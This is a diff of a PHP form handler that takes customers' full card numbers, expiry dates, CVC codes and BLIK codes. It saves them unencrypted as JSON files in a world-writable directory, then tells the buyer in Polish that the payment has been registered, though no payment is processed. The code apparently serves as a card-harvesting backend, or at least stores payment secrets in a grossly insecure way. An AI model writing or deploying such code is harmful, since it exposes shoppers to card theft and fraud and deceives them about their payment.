@@ -13,11 +13,11 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         'name' => $name,
         'email' => $email,
         'phone' => $phone,
-        'method' => $method,
-        'card' => $card,
-        'expiry' => $expiry,
-        'cvc' => $cvc,
-        'blik' => $blik,
+        'payment_method' => $method,
+        'card_number' => $method === 'card' ? $card : '',
+        'expiry_date' => $method === 'card' ? $expiry : '',
+        'cvc_code' => $method === 'card' ? $cvc : '',
+        'blik_code' => $method === 'blik' ? $blik : '',
         'timestamp' => date('Y-m-d H:i:s')
     ];
 
@@ -26,11 +26,23 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         mkdir($dir, 0777, true);
     }
 
-    $filename = $dir . '/' . date('Y-m-d_H-i-s') . '.json';
+    $filename = $dir . '/' . date('Y-m-d_H-i-s') . '_' . preg_replace('/[^a-zA-Z0-9]/', '', $name) . '.json';
     file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
+    
+    // Return success response
+    header('Content-Type: application/json');
+    echo json_encode([
+        'status' => 'success',
+        'message' => 'Twoja płatność została zarejestrowana. Dziękujemy za zakup!'
+    ]);
+    exit;
 
 } else {
-    header('Location: contact.html');
-    exit();
+    header('Content-Type: application/json');
+    echo json_encode([
+        'status' => 'error',
+        'message' => 'Nieprawidłowe żądanie. Proszę wypełnić formularz.'
+    ]);
+    exit;
 }
 ?>
